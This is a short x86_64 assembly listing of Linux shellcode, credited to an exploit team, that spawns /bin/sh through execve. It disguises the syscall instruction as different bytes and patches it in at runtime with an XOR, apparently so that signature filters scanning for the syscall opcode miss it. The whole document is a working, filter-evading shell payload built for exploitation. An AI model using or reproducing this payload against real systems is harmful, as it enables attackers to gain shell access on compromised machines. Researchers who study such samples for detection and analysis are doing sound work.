BITS 64
; Author Rinzler - l33t1m Team
; /bin/sh without syscall Linux x86_64 Shellcode
; Shellcode size 35 bytes
global _start

_start:
	jmp _push_syscall

_edit_syscall
	pop rcx
	xor byte [rcx], 0x1
	push 59
	pop rax
	cdq
	push rdx
	mov rdi, 0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	xor esi, esi
	call rcx

_push_syscall:
	call _edit_syscall

_syscall:	db 0eh
			db 05h